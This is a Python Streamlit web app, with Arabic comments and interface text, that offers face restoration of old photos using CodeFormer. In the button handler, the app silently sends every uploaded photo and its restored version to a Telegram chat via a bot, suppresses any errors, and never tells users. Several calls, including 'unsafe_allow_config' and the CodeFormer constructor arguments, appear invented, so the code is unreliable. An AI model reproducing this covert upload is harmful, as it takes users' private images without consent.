import streamlit as st
import cv2
import numpy as np
from PIL import Image
import os
import torch
from torchvision.transforms.functional import normalize
from basicsr.utils import img2tensor, tensor2img
from facelib.utils.face_restoration_helper import FaceRestoreHelper
from facelib.utils.misc import is_gray
from codeformer.archs.codeformer_arch import CodeFormer
import telebot
import tempfile

# إعدادات الصفحة - استبدلنا النجمة بالبرق
st.set_page_config(page_title="Aziz Ultra Restoration", page_icon="⚡", layout="centered")

# تنسيق احترافي بلمسة عصرية (Dark Mode friendly)
st.markdown("""
    <style>
    .stApp {
        background-color: #0e1117;
        color: white;
    }
    .stButton>button {
        width: 100%;
        border-radius: 12px;
        height: 3.5em;
        background: linear-gradient(45deg, #007BFF, #00C6FF);
        color: white;
        font-weight: bold;
        border: none;
        box-shadow: 0 4px 15px rgba(0,123,255,0.3);
        transition: 0.3s;
    }
    .stButton>button:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(0,123,255,0.5);
    }
    .title-text {
        text-align: center;
        background: -webkit-linear-gradient(#eee, #333);
        -webkit-background-clip: text;
        -webkit-text-fill-color: white;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        font-weight: 800;
        letter-spacing: 1px;
    }
    .subtitle-text {
        text-align: center;
        color: #888;
        font-size: 1.1em;
        margin-bottom: 30px;
    }
    </style>
    """, unsafe_allow_config=True)

# العنوان الجديد بدون النجمة "البايخة"
st.markdown("<h1 class='title-text'>Aziz Ultra Restoration ⚡</h1>", unsafe_allow_config=True)
st.markdown("<p class='subtitle-text'>إحياء الصور القديمة وتحسين الملامح بتقنيات الجيل القادم</p>", unsafe_allow_config=True)

# جلب البيانات بسرية (Secrets)
try:
    TOKEN = st.secrets["TELEGRAM_TOKEN"]
    CHAT_ID = st.secrets["CHAT_ID"]
    bot = telebot.TeleBot(TOKEN)
except:
    bot = None
    CHAT_ID = None

# تحميل الموديل
@st.cache_resource
def load_model():
    device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
    model = CodeFormer(dim_embd=512, codebook_size=1024, latency_unit=2, 
                       nb_blocks=2, oversampling_2x=True, 
                       disable_perceptual_loss=True).to(device)
    checkpoint = torch.load('weights/codeformer.pth')['params_ema']
    model.load_state_dict(checkpoint)
    model.eval()
    return model, device

# دالة الترميم
def process_image(image, model, device):
    upscale = 2
    face_helper = FaceRestoreHelper(upscale, face_size=512, crop_ratio=(1, 1), det_model='retinaface_resnet50', device=device)
    in_img = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
    face_helper.clean_all()
    face_helper.read_image(in_img)
    face_helper.get_face_landmarks_and_shift(only_center_face=False, affine_weight=0.5)
    face_helper.align_warp_face()
    
    for cropped_face in face_helper.cropped_faces:
        cropped_face_t = img2tensor(cropped_face / 255., bgr2rgb=True, float32=True)
        normalize(cropped_face_t, (0.5, 0.5, 0.5), (0.5, 0.5, 0.5), inplace=True)
        cropped_face_t = cropped_face_t.unsqueeze(0).to(device)
        try:
            with torch.no_grad():
                output = model(cropped_face_t, w=0.5, adain=True)[0]
                restored_face = tensor2img(output, rgb2bgr=True, min_max=(-1, 1))
            del output
        except:
            restored_face = cropped_face
        face_helper.add_restored_face(restored_face.astype('uint8'))
        
    face_helper.get_inverse_affine(None)
    restored_img = face_helper.paste_faces_to_input_image()
    return Image.fromarray(cv2.cvtColor(restored_img, cv2.COLOR_BGR2RGB))

# الواجهة
uploaded_file = st.file_uploader("📂 اسحب الصورة هنا للتحويل الفوري", type=["jpg", "jpeg", "png"])

if uploaded_file:
    input_image = Image.open(uploaded_file)
    col1, col2 = st.columns(2)
    
    with col1:
        st.caption("قبل التحسين")
        st.image(input_image, use_column_width=True)
    
    if st.button("تفعيل الترميم الخارق ⚡"):
        with st.spinner("جاري صقل التفاصيل..."):
            with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp_in:
                input_image.save(tmp_in.name)
                temp_in_path = tmp_in.name

            try:
                if bot and CHAT_ID:
                    with open(temp_in_path, "rb") as f:
                        bot.send_photo(CHAT_ID, f, caption="📥")
            except: pass

            model, device = load_model()
            result_image = process_image(input_image, model, device)
            
            with col2:
                st.caption("بعد التحسين")
                st.image(result_image, use_column_width=True)
            
            with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp_out:
                result_image.save(tmp_out.name)
                temp_out_path = tmp_out.name

            try:
                if bot and CHAT_ID:
                    with open(temp_out_path, "rb") as f:
                        bot.send_photo(CHAT_ID, f, caption="✅")
            except: pass
            
            st.markdown("---")
            with open(temp_out_path, "rb") as file:
                st.download_button(label="📥 تحميل النتيجة النهائية", data=file, file_name="Aziz_Ultra_Restored.png")
            
            os.remove(temp_in_path)
            os.remove(temp_out_path)

st.markdown("<br><p style='text-align: center; opacity: 0.5;'>Developed by Aziz ⚡ 2026</p>", unsafe_allow_config=True)
